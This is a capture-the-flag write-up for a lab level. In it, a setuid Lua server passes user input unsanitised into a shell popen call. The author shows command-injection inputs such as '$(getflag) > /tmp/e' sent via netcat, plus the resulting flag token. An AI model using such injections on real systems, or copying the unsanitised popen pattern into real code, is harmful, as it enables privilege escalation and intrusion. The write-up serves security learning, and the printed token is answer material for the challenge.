What do we have?

	$ ll
	total 16
	dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
	-r-x------  1 level11 level11  675 Apr  3  2012 .profile*

A `.lua` file, with the rights of the owner. If we `cat` it:

	$ cat level11.lua 
	#!/usr/bin/env lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()

	data = string.sub(data, 1, 40)

	return data
	end


	while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local l, err = client:receive()
	if not err then
		print("trying " .. l)
		local h = hash(l)

		if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
			client:send("Erf nope..\n");
		else
			client:send("Gz you dumb*\n")
		end

	end

	client:close()
	end

So, it's a server listening on `localhost` with the port `5151`. It asks for an input from the client, and run some bash command with it... We definitely have to give it `getflag`, somehow. We can't run the `.lua` directly, as the port is already used. We'll look into it later, so for now, we created a copy of the server but with a different port, to make a few tries and analysis.

With the copy, we quickly succeeded in provoking a syntax error by closing the call to `echo` early, proving that it was possible to do our idea.

	// CLIENT
	$ nc localhost 5152
	Password: ;
	Erf nope..

	// SERVER
	trying ;
	sh: 1: Syntax error: "|" unexpected

We then gave the expand of `getflag` (`$(getflag)`) in input, but we did not see the result, as it is piped in the subshell... So, we tested with redirections, to redirect `stdout`, which is piped, to `stderr`.

	// CLIENT
	$ nc localhost 5152
	Password: $(getflag) 1>&2
	Erf nope..

	// SERVER
	trying $(getflag) 1>&2
	Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)

So we did get the output, but it's server-side... Going back to the problem of port already in use, trying to communicate with it show what seems to be the `.lua` server... It just was already running.

	$ nc localhost 5151
	Password: abc
	Erf nope..

Last problem, the output was server-side... That mean we can't access it, so let's just do a simple redirection to a file.

	$ nc localhost 5151
	Password: $(getflag) > /tmp/e
	Erf nope..
	$ cat /tmp/e
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
